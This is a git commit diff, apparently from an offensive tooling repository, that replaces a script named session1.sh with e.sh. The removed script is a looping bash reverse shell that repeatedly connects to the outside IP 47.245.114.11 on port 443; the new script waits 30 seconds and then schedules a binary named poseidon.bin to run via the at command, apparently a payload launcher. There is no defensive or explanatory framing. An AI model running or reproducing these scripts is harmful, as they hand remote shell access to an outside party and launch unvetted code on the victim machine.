42165f4e1582f2a68e5a262108239598eae9d9c7
Eshan Sharma <37268525+Forsaken0129@users.noreply.github.com>
2023-11-21 13:19:40 +0530

    Update and rename session1.sh to e.sh

---
+++ e.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+# Sleep for 30 seconds
+sleep 30
+# Run the command using the at command
+echo './poseidon.bin' | at now
--- session1.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-while true
-do
-  # Try to establish the connection
-  /bin/bash -c 'if ! bash -i >& /dev/tcp/47.245.114.11/443 0>&1; then sleep 10; fi'
-done
